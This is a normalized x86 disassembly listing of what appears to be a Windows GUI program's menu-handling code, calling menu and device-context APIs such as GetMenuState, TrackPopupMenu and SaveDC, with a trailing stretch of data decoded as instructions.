xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45c870
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45c870
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45c870
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45c3dc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45c2cc
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45c360
mov eax ebx
call sub_45c894
jmp r-xdata
sub_45c444
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45c48c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_4566bc
mov eax ebx
call sub_45bca0
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_456700
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_4207e4
sub_45c4c8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420a30
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45c48c
sub_45c50c
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45bd50
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_45bd50
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_45f800
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45c568
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45c63d
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45bd50
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45bd50
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45a8fc
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4041f0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4041f0
mov eax [ ebp - 0xc ]
pop edx
call sub_407ec0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45d3b4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c644
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40402c
retn
sub_45c650
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45c50c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45c568
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45c7c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_45bed4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_45bd50
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_45bd50
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_4086f4
mov eax [ ebp + 0x10 ]
call sub_408638
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45c894
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_4459d4
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45c870
mov [ ebx + 0x41 ] 0x1
sub_45c8bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45c870
mov [ ebx + 0x41 ] 0x1
sub_45c948
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45c444
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45c2cc
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_45c9d8
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45ca14
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ca3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ca60
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45cf93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cf9a
lea eax [ ebp - 0x30 ]
call sub_404008
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ esi + 0x4 ]
call sub_45be0c
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_468e10
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov dx [ esi + 0x4 ]
call sub_45bdf0
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45cdc6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45cda9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_424934
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4247d4
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45d238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cdb0
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424934
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_45c650
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_45bd50
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45bd50
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45cf09
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45cee4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45cec7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_424934
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4247d4
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cece
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424934
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_445c58
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468e10
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_45bd50
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_45bd50
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_45bd50
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_45bd80
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418310
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_45bd80
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_468ab4
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_468b1c
jmp r-xdata
sub_45ceeb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45cfa4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4181b4
pop esi
pop ebx
retn
push ebx
push sub_45ca14
call sub_421860
mov [ ebx + 0x10 ] eax
sub_45cfe8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45bb68
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45cfa4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_45d05c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45cfcc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45bc04
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_45d0b4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_457f00
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45c870
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45c870
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45d0fc
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_457f00
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_467660
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_40348c
mov edx eax
jmp r-xdata
sub_45d148
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416cac
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45d0b4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45b4bc
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45b9b8
mov eax [ ebx + 0x34 ]
call sub_458d60
mov eax ebx
call sub_45c360
mov eax ebx
call sub_45d0fc
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_458e90
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45d1fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418310
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418310
cmp ebp [ eax ]
jne r-xdata
sub_45d238
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423fb4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4237e8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_423fb4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4237e8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40348c
mov edx [ r-xdata ]
call sub_40341c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423fb4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4237e8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45d320
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40405c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4042c8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404568
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4042c8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404568
jmp r-xdata
sub_45d3b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404008
mov ebx 0x1
mov eax esi
call sub_4042c8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4041f0
sub_45d418
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d471
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45d320
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45d320
mov eax [ ebp - 0x8 ]
pop edx
call sub_407ef8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d478
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_45d480
adc al [ eax ]
add [ eax ] al
fcomp [ ebp + 0x47 ]
add [ eax + 0x60 ] cl
inc edi
add al bl
pop ebp
inc edi
add [ eax ] cl
inc edi
add ah dl
pop ebp
inc edi
add al al
pop edi
inc edi
add al dl
pop ebp
inc edi
add al dh
pop edi
inc edi
add ah cl
pop ebp
inc edi
add ah dl
bound eax [ edi ]
enter 0x475d 0x0
clc
pop edi
inc edi
add ah al
pop ebp
inc edi
add [ ecx + 0x47 ] ah
add al al
pop ebp
inc edi
add al bl
pushad
inc edi
add [ ebp + ebx * 2 + 0x636c0047 ] bh
inc edi
add [ eax + 0x6800475d ] bh
arpl [ edi ] ax
mov ah 0x5d
inc edi
add [ eax - 0x4fffb8a0 ] dl
pop ebp
inc edi
add [ eax ] ah
arpl [ edi ] ax
lodsb [ esi ]
pop ebp
inc edi
add ah bl
bound eax [ edi ]
test al 0x5d
inc edi
add [ ebx + 0x5da40047 ] bh
inc edi
add [ eax - 0x5fffb89d ] cl
pop ebp
inc edi
add [ eax - 0x63ffb8a0 ] ah
pop ebp
inc edi
add [ eax + 0x5d980047 ] dh
inc edi
add al dh
pushad
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45d578
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d57f
retn
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax [ rw-data ]
call sub_403290
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
call sub_404008
sub_45d584
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45d480
call sub_403db4
mov eax [ r-xdata ]
call sub_417944
mov eax [ r-xdata ]
